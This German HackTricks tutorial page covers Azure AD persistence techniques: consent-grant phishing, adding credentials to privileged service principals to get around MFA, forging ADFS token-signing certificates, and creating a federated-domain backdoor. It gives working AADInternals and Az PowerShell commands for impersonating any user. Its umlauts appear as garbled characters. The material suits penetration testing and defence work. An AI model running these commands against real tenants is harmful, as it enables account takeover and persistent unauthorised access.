# Az - Persistenz

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

### Illegitime Zustimmungserteilung

Standardm√§√üig kann sich jeder Benutzer in Azure AD registrieren. Sie k√∂nnen also eine Anwendung registrieren (nur f√ºr das Zielmandant), die hohe Auswirkungsberechtigungen mit Admin-Zustimmung ben√∂tigt (genehmigen Sie sie, wenn Sie der Administrator sind) - wie das Senden von E-Mails im Namen eines Benutzers, Rollenverwaltung usw. Dies erm√∂glicht es uns, **Phishing-Angriffe** durchzuf√ºhren, die im Erfolgsfall sehr **erfolgreich** w√§ren.

Dar√ºber hinaus k√∂nnten Sie diese Anwendung auch mit Ihrem Benutzer akzeptieren, um den Zugriff darauf aufrechtzuerhalten.

### Anwendungen und Dienstprinzipale

Mit den Berechtigungen eines Anwendungsadministrators, GA oder einer benutzerdefinierten Rolle mit Berechtigungen f√ºr microsoft.directory/applications/credentials/update k√∂nnen wir Anmeldeinformationen (Geheimnis oder Zertifikat) zu einer vorhandenen Anwendung hinzuf√ºgen.

Es ist m√∂glich, auf eine Anwendung mit hohen Berechtigungen abzuzielen oder eine neue Anwendung mit hohen Berechtigungen hinzuzuf√ºgen.

Eine interessante Rolle, die der Anwendung hinzugef√ºgt werden k√∂nnte, ist die **Rolle des privilegierten Authentifizierungsadministrators**, da sie es erm√∂glicht, das Passwort von Globalen Administratoren **zur√ºckzusetzen**.

Diese Technik erm√∂glicht es auch, die **MFA zu umgehen**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* F√ºr die Authentifizierung basierend auf Zertifikaten

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### F√∂deration - Token-Signaturzertifikat

Mit **DA-Berechtigungen** auf dem lokalen AD ist es m√∂glich, **neue Token-Signatur**- und **Token-Entschl√ºsselungszertifikate** zu erstellen und zu importieren, die eine sehr lange G√ºltigkeitsdauer haben. Dies erm√∂glicht es uns, uns als **beliebiger Benutzer** anzumelden, dessen ImuutableID wir kennen.

**F√ºhren Sie** den folgenden Befehl als **DA auf den ADFS-Server(n)** aus, um neue Zertifikate zu erstellen (Standardpasswort 'AADInternals'), f√ºgen Sie sie zu ADFS hinzu, deaktivieren Sie die automatische Rollback-Funktion und starten Sie den Dienst neu:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Dann aktualisieren Sie die Zertifikatinformationen mit Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### F√∂deration - Vertrauensw√ºrdige Dom√§ne

Mit GA-Berechtigungen in einem Mandanten ist es m√∂glich, eine **neue Dom√§ne hinzuzuf√ºgen** (muss √ºberpr√ºft werden), ihren Authentifizierungstyp auf F√∂deriert zu konfigurieren und die Dom√§ne so zu konfigurieren, dass sie einem bestimmten Zertifikat (any.sts im folgenden Befehl) und Herausgeber vertraut:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Referenzen

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
